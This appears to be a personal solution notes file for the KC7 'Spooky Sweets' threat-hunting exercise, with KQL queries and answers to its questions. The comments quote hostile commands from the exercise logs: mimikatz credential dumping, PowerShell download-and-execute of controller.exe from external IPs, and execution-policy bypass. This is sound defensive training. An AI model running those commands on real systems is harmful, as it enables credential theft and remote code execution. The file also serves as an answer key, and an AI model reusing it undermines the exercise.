// Spooky Sweets

// Section 0

// Q2 - How many employees are in the company?
Employees
| count

// Q3 - Each employee at Spooky Sweets Candy Company is assigned an IP address. Which employee has the IP address: “10.10.0.251”?
Employees
| where ip_addr == "10.10.0.251"
// Arthur Wigfall - 10.10.0.251 - arthur_wigfall@spookysweets.xyz - arwigfall - QCDR-LAPTOP - Candy Intern

// Q4 - How many emails did Timothy Moran receive?
Employees
| where name == "Timothy Moran"
// 10.10.0.57 - timothy_moran@spookysweets.xyz - ARIH-DESKTOP

Email
| where recipient == "timothy_moran@spookysweets.xyz"
| count

// Q5 - How many distinct senders were seen in the email logs from spoopycandysupplies.com?
Email
| where sender has "spoopycandysupplies.com"
| distinct sender
| count

// Q6 - How many unique websites did “Michael Dawson” visit?
Employees
| where name == "Michael Dawson"
// 10.10.0.113 - michael_dawson@spookysweets.xyz - midawson - 6RD0-MACHINE

OutboundNetworkEvents
| where src_ip == "10.10.0.113"
| distinct url
| count

// Q7 - How many domains in the PassiveDns records contain the word “Halloween”? (hint: use the contains operator instead of has. If you get stuck, do a take 10 on the table to see what fields are available.)
PassiveDns
| where domain contains "Halloween"

// Q8 - What IPs did the domain “halloween-infrastructure.com” resolve to (enter any one of them)?
PassiveDns
| where domain contains "halloween-infrastructure.com"
// 17.10.87.161 - halloween-infrastructure.com

// Q9 - How many unique URLs were browsed by employees named “Karen”?
let karen_ips =
Employees
| where name has "Karen"
| distinct ip_addr;
OutboundNetworkEvents
| where src_ip in (karen_ips)
| distinct url
| count

// Section 1

// Q1
// spooky.png

// Q2 - Let's search for this file. How many hosts have this file? 
FileCreationEvents
| where filename == "spooky.png"
| distinct hostname
| count

// Q3 - 
FileCreationEvents
| where filename == "spooky.png"
| take 10

// Q4 - When was the first wallpaper created? 
FileCreationEvents
| where filename == "spooky.png"
// 2023-10-09T02:00:42Z

// Q5 - What is the SHA256 of that file? 
FileCreationEvents
| where filename == "spooky.png"
// c27383277bf017f56b4d5b7b11419b09230b264fb40b0c42311c59f4c596a5f8

// Q6 - Let's look at the host where the first wallpaper was created. What is the role of the employee that uses this computer? 
// KQQT-DESKTOP - rojoyner
Employees
| where hostname == "KQQT-DESKTOP"
| distinct role

// Q7 - The threat actor must have left something behind to show how they set the wallpaper. What time did they set the wallpaper on this host? 
ProcessEvents
| where hostname == "KQQT-DESKTOP"
// reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d C:\Users\Public\Pictures\spooky.png /f
// 2023-10-09T04:18:46Z

// Q8 - What command did they run to update the host system to the new wallpaper?
ProcessEvents
| where hostname == "KQQT-DESKTOP"
| where timestamp >= datetime(2023-10-09T04:18:46Z)

// Q9 - It was reported that around the same time the wallpapers changed, a lot of people got an email about mandatory training they had to do.
// How long was this video? Provide the format in MM:SS (ex. 12:34).
Email
| where subject has "training"
// https://www.youtube.com/watch?v=dQw4w9WgXcQ

// Q10 - All of these training emails were sent to employees with the same role. Which job role received the email? 
let emp_emails =
Email
| where subject has "training"
| distinct recipient;
Employees
| where email_addr in (emp_emails)
| distinct role

// Q11 - Let's see if the threat actor reached out to targets via email in the past. How many emails have subject lines with the hacker group's name in them?
Email
| where subject has "Patch"
| count

// Q12 -Q13
// Q12 - Most of those emails were sent from which email address?
Email
| where subject has "Patch"
// boo.boo@hotmail.com

// Q13 - Which of the links in those emails contains an important file?
Email
| where subject has "Patch"
| distinct link
// https://spooky-fall.com/modules/public/public/important-letter.docx
// http://spookyfall.com/images/final_notice.xlsx

// Q14 - What IP does the domain from that link resolve to?
PassiveDns
| where domain has "spooky-fall.com"
// 141.107.162.16

// Q15 - When did that IP visit the Spooky Sweets website?
InboundNetworkEvents
| where src_ip == "141.107.162.16"
// 2023-10-02T03:39:28Z

// Q 16 - The activity from Q15 demonstrates which MITRE ATT&CK technique?
// T1594 - https://attack.mitre.org/techniques/T1594/

// Q17 - Hey!! The IT folks said to stop what you're doing and investigate another set of emails they got around the same time wallpapers were changed. Within the link, what is the wisdom they impart? 
Email
| where timestamp >= datetime(2023-10-09T04:18:46Z)
// https://www.youtube.com/watch?v=D-UmfqFjpl0

// Q18 - … Let's go back to our email investigation. Looking at the phishing emails sent by the adversary, which number will surprise us? 
Email
| where link has "final_notice.xlsx"

Email
| where sender has "booiknowwhatyoudid@yandex.com" or sender has "boo.boo@hotmail.com" or sender has "boo.iknowwhatyoudid@gmail.com"
// [EXTERNAL] The Internet's Top 10 Spooky list. Number 3 will surprise you...
// iknowwhatyoudid_spooky@protonmail.com
// http://infrastructurebusiness.com/share/search/internal-memo.docx

// Q19 - What's the name of the excel document they sent?
Email
| where subject has "Patch"

// Q20 - Some time after the initial emails they sent follow up emails to gather more information. What domain did the senders come from? 
// From query in Q9
Email
| where subject has "training"
// spookysweets.xyz

// Q21 - Hmm, that's really weird. What was the subject? 
Email
| where sender has "james_matthews@spookysweets.xyz"
| where timestamp >= datetime(2023-10-09T04:18:46Z)

let recipients =
Email
| where sender has "booiknowwhatyoudid@yandex.com" or sender has "boo.boo@hotmail.com" or sender has "boo.iknowwhatyoudid@gmail.com"
| distinct recipient;
Email
| where sender in (recipients)
| summarize count()by subject

// Unusual Logon. Please verify your login activity.
// URGENT: Please provide locations where your research is located.


// Q22 - Several employees clicked on the link and got compromised. When the attackers got access to those employees' machines, they decided to move laterally. What command was used to dump credentials on several hosts?
Email
| where subject has "Unusual Logon. Please verify your login activity."
| where timestamp <= datetime(2023-10-09T04:18:46Z)

ProcessEvents
| where hostname == "SIHL-DESKTOP"
| where process_commandline contains "dump"
// Desktop Change Time - 2023-10-10T04:26:31Z

let recipients =
Email
| where sender has "booiknowwhatyoudid@yandex.com" or sender has "boo.boo@hotmail.com" or sender has "boo.iknowwhatyoudid@gmail.com"
| distinct recipient;
let comp_hosts =
Employees
| where email_addr in (recipients)
| distinct hostname;
ProcessEvents
| where hostname in (comp_hosts)
| summarize count()by process_commandline
// used the number of the recipients to estimate where to look interesting commands I saw:
// mimikatz.exe "sekurlsa::logonpasswords" showed up 19 times

// Q23 - What is the MITRE ATT&CK ID of this tool?
// S0002 remembered from a previous case.

// Q24 - What command was used to look at all of the computers within a domain? 
// Using the same query from Q22 look at commands ran 19 times.
// net view /all /domain

// Q25 - When was the first time this command was executed?
ProcessEvents
| where process_commandline has "net view /all /domain"
// 2023-10-02T11:55:34Z - TQ3G-DESKTOP - sccrissman

// Q26 - Who is the user of that host? Provide the full name.
Employees
| where username has "sccrissman"
| distinct name
// Scott Crissman

// Q27 - What command used by the threat actor was used to look for information about services?
// Same query fro Q22 - Brute force commands used 19 times 
// sc query

// Q28 - What is the MITRE ATT&CK ID for this type of technique?
// T1007 System Service Discovery - Go to this page (https://attack.mitre.org/techniques/enterprise/) and search "sc query" 

// Q29 - It was reported that Carlton Toth had a significant security alert. Look for what the alert is. What file was alerted? 
Employees
| where name == "Carlton Toth"
// 10.10.0.48 - carlton_toth@spookysweets.xyz - P7DJ-LAPTOP - Candy Scientist - catoth

SecurityAlerts
| where indicators contains "P7DJ-LAPTOP"
// treat.ps1
// [{'hostname': 'P7DJ-LAPTOP', 'sha256': '5ca8e69c92fd1ae4bef806b97ff7dd301c2efc3a962c6229057ebfc26a034eed', 'filename': 'treat.ps1'}]

// Q30 - Let's investigate that file path across all of the hosts. How many other files were found in that directory? 
FileCreationEvents
| where sha256 == "5ca8e69c92fd1ae4bef806b97ff7dd301c2efc3a962c6229057ebfc26a034eed"
// Dir from Carltons system - C:\PerfLogs\treat.ps1

FileCreationEvents
| where path contains "C:\\PerfLogs"
| distinct filename

FileCreationEvents
| where sha256 == "5ca8e69c92fd1ae4bef806b97ff7dd301c2efc3a962c6229057ebfc26a034eed"
| distinct path
| count

// Q31 - Which file was executed through a network share?
let hosts =
FileCreationEvents
| where sha256 == "5ca8e69c92fd1ae4bef806b97ff7dd301c2efc3a962c6229057ebfc26a034eed"
| distinct hostname;
Employees
| where hostname in (hosts)
| distinct role

let bad_files =
FileCreationEvents
| where path contains "C:\\PerfLogs"
| distinct filename;
ProcessEvents
| where process_commandline has_any (bad_files)
// cmd.exe /c start %SYSTEMROOT%\system32\WindowsPowerShell\v1.0\powershell.exe -noni -nop -exe bypass -f \\share1\Admin$\trick.ps1

// Q32 - Which other file was executed?
// Using same query from 31 

// Q33 - Which executive management role had some of these files on their host? 
let bad_files =
FileCreationEvents
| where path contains "C:\\PerfLogs"
| distinct filename;
let hosts_w_file =
FileCreationEvents
| where filename in (bad_files)
| distinct hostname;
Employees
| where hostname in (hosts_w_file)
| distinct role

// Q34 - How many distinct job roles had these files in that directory?
// previous query 9 minus the chief is 8

// Q35 - What is the SHA256 hash of the wallpaper from Section 1, Q1? 
// Downloaded the file
// https://www.geeksforgeeks.org/generating-an-sha-256-hash-from-the-command-line/
// Downloaded the file shown in Q1 using curl to my WSL2
// >> curl -o spooky.png "https://raw.githubusercontent.com/KC7-Foundation/kc7_data/refs/heads/main/SpookySweets/spooky.png"
// >> sha256sum spooky.png
// Got it
// 499d342...

// Q36 - It doesn't seem to be the same file extension it's saying it is. What type of file is it? 
// >> file spooky.png
// spooky.png: JPEG image data, JFIF standard 1.01, resolution (DPI), density 216x216, segment length 16, baseline, precision 8, 1179x878, components 3

// Q37 - 
// Went to the github repo
// https://github.com/KC7-Foundation/kc7_data/blob/main/SpookySweets/trickortreat.png -- Nope
// Upload image to Virus total to get the names. wallpaper pumpkin actor.jpg

// Q38 - Let's go back and double check. What other picture did the threat actor drop on the systems?
FileCreationEvents
| where filename contains "trick"
| distinct filename
// trickortreat.png

// Q39 - The CEO of the company sat everyone down during the all hands meeting and said it was all a test. What type of group would conduct these types of tests? 
// Red Team

// Section 2
// Q1 - How many users were seen accessing this document?
InboundNetworkEvents
| where url contains "candy_project"

InboundNetworkEvents
| where url has "https://sharepoint.spookysweets.xyz/candy_projects/files/research.docx"
| distinct src_ip 

// Q2 - These users were certainly behaving strangely. What content were they sending around?
let noesy_ips =
InboundNetworkEvents
| where url has "https://sharepoint.spookysweets.xyz/candy_projects/files/research.docx"
| distinct src_ip;
let sneaky_domains =
PassiveDns
| where ip in (noesy_ips)
| distinct domain;
let curious_ips =
OutboundNetworkEvents
| where url has_any (sneaky_domains)
| distinct src_ip;
let curious_emails = 
Employees
| where ip_addr in (curious_ips)
| distinct email_addr;
Email
| where sender has_any (curious_emails) and recipient has_any (curious_emails)
// They are sending around a youtube video link.

// Q3 - What is the name of that file?
let noesy_ips =
InboundNetworkEvents
| where url has "https://sharepoint.spookysweets.xyz/candy_projects/files/research.docx"
| distinct src_ip;
let sneaky_domains =
PassiveDns
| where ip in (noesy_ips)
| distinct domain;
let curious_ips =
OutboundNetworkEvents
| where url has_any (sneaky_domains)
| distinct src_ip;
let curious_hostnames = 
Employees
| where ip_addr in (curious_ips)
| distinct hostname;
ProcessEvents
| where hostname in (curious_hostnames)
| where process_commandline contains "download"
| summarize count()by process_commandline
// Found by looking through the process commandline without the download filter the first time. Saw whoami and some other commands. looked below there.
// powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('https://68.45.221.34/controller.exe'))"
// powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('https://196.2.219.94/controller.exe'))"
// appears to be 6 different IPs


// Group of investtigative commands 
Email
| where link has_any (sneaky_domains)
| summarize count()by link

FileCreationEvents
| where filename has "research.docx"
// AEI8-LAPTOP - caames - 2023-09-29T10:23:35Z

Employees
| where hostname == "AEI8-LAPTOP"
// carol_ames@spookysweets.xyz - 10.10.1.170

Email
| where sender == "carol_ames@spookysweets.xyz"

ProcessEvents
| where hostname == "AEI8-LAPTOP"


PassiveDns
| where ip == "196.2.219.94"
// regulationscompliance.com

OutboundNetworkEvents
| where url contains "regulationscompliance.com"
// END

// Q4 - Find the initial access vector for this intrusion. What message did it include about 10/31?
let noesy_ips =
InboundNetworkEvents
| where url has "https://sharepoint.spookysweets.xyz/candy_projects/files/research.docx"
| distinct src_ip;
let sneaky_domains =
PassiveDns
| where ip in (noesy_ips)
| distinct domain;
Email
| where link has_any (sneaky_domains)
// REad the list of subjects.
// Your facility is closing on October 31.
// https://healthcompliance.net/online/modules/actionrequired.docx

// Q5 - Which role did the actors primarily target?
let noesy_ips =
InboundNetworkEvents
| where url has "https://sharepoint.spookysweets.xyz/candy_projects/files/research.docx"
| distinct src_ip;
let sneaky_domains =
PassiveDns
| where ip in (noesy_ips)
| distinct domain;
let targets =
Email
| where link has_any (sneaky_domains)
| distinct recipient;
Employees
| where email_addr in (targets)
| distinct role
// Regulatory Candy Specialist

// Q6 - Once the threat actor got in to the environment, they were interested in another type of recon and were trying to figure out how to do it. Who helped them indirectly? 
let noesy_ips =
InboundNetworkEvents
| where url has "https://sharepoint.spookysweets.xyz/candy_projects/files/research.docx"
| distinct src_ip;
let sneaky_domains =
PassiveDns
| where ip in (noesy_ips)
| distinct domain;
let curious_ips =
OutboundNetworkEvents
| where url has_any (sneaky_domains)
| distinct src_ip;
Employees
| where ip_addr in (curious_ips)
| distinct username



ProcessEvents
| where hostname in (curious_hostnames)
| where process_commandline has "whoami"

// Q7 - Based off of the answer from Q3, how many unique IP addresses did they obtain this file from? 
let noesy_ips =
InboundNetworkEvents
| where url has "https://sharepoint.spookysweets.xyz/candy_projects/files/research.docx"
| distinct src_ip;
let sneaky_domains =
PassiveDns
| where ip in (noesy_ips)
| distinct domain;
let curious_ips =
OutboundNetworkEvents
| where url has_any (sneaky_domains)
| distinct src_ip;
let curious_hostnames = 
Employees
| where ip_addr in (curious_ips)
| distinct hostname;
ProcessEvents
| where hostname in (curious_hostnames)
| where process_commandline contains "controller.exe"
| extend ExtractedIP = extract(@"\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b", 0, process_commandline)
| where isnotempty(ExtractedIP)
| distinct ExtractedIP
// Brute forced. 

// Extra stuff from Q7
| summarize count()by process_commandline

| extend ExtractedIP = extract(@"\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b", 0, process_commandline)
| where isnotempty(ExtractedIP)
| distinct ExtractedIP

| where process_commandline contains "downloadstring"
| summarize count()by process_commandline
// END

// Q8
let noesy_ips =
InboundNetworkEvents
| where url has "https://sharepoint.spookysweets.xyz/candy_projects/files/research.docx"
| distinct src_ip;
PassiveDns
| where ip in (noesy_ips)
| distinct domain
// minus 1

// Q9 - Which IP address is from the country where the Nile River is located in? 
// Q10 - What tool did the threat actor most likely install for final actions on objectives?
InboundNetworkEvents
| where url has "https://sharepoint.spookysweets.xyz/candy_projects/files/research.docx"
| distinct src_ip

// Q11 - What tool did the threat actor most likely install for final actions on objectives?
let noesy_ips =
InboundNetworkEvents
| where url has "https://sharepoint.spookysweets.xyz/candy_projects/files/research.docx"
| distinct src_ip;
let sneaky_domains =
PassiveDns
| where ip in (noesy_ips)
| distinct domain;
let curious_ips =
OutboundNetworkEvents
| where url has_any (sneaky_domains)
| distinct src_ip;
let curious_hostnames = 
Employees
| where ip_addr in (curious_ips)
| distinct hostname;
ProcessEvents
| where hostname in (curious_hostnames)

| summarize host_count = dcount(hostname), affected_hosts = make_set(hostname) by process_commandline
| where host_count > 1
| order by host_count desc;



| distinct process_name

// Poking arround
ProcessEvents
| where hostname == "7FRE-LAPTOP"
| where process_commandline has "spooky"
// 2023-10-05T09:30:31Z
// something interesting here: 2023-10-09T09:46:42Z
// hmm... -Nop -ExecutionPolicy bypass -enc 
// what is this? UserOOBEBroker.exe

ProcessEvents
| where process_commandline has "-Nop -ExecutionPolicy bypass -enc "
| distinct process_commandline

FileCreationEvents
| where filename has ""
| summarize count()by filename
// Interesting: mimikatz_output.txt seen 26 times
// Werid stuff: CustomInstallExec.exe.mui

ProcessEvents
| where process_commandline has "mimikatz"
| distinct process_commandline

let noesy_ips =
InboundNetworkEvents
| where url has "https://sharepoint.spookysweets.xyz/candy_projects/files/research.docx"
| distinct src_ip;
let sneaky_domains =
PassiveDns
| where ip in (noesy_ips)
| distinct domain;
let emps_targeted =
Employees
| where role == "Regulatory Candy Specialist"
| distinct email_addr;
Email
| where subject contains "Unusual Logon. Please verify your login activity."
| where link in (sneaky_domains)


ProcessEvents
| where process_commandline contains "R2V0dGluZyB0aGUgYW5zd2VyIGlzbid0IGdvaW5nIHRvIGJlIGVhc3ksIGJ1dCBub3QgdGhhdCBoYXJkIGVpdGhlci4gU29tZSB3b3VsZCBzYXkgaXRzIHRoZSBwZXJmZWN0IE1lZGl1bS4gVGhlIGFuc3dlciBtYXkgbm90IGJlIE91dCB5ZXQsIGJ1dCBpdCdzIEJvdW5kIHRvIGJlLg=="